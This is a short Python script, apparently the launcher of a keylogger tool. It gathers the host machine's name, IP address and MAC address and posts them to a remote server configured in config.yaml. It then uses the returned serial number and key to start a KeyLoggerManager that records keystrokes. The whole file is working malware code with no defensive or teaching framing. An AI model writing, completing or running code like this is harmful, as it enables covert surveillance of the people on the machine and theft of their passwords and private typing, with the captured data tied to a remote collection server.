import manager as keylogger
import requests, uuid, socket,yaml

with open("config.yaml", "r") as f:
    config = yaml.safe_load(f)

URL = config['general']['base_url']



def create_logger()->bool:
    host_name = socket.gethostname()
    ip_address = socket.gethostbyname(host_name)
    mac_address = hex(uuid.getnode())
    data = {
        "host name": host_name,
        "ip": ip_address,
        "mac address": mac_address
    }
    try:
        response = requests.post(URL + '/api/machine', json=data)
        response_dict = response.json()
        serial_number = response_dict['serial_number']
        key = response_dict['key']
        key_logger = keylogger.KeyLoggerManager(serial_number,key)
        key_logger.start_logging()
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False


if __name__ == "__main__":
    create_logger()
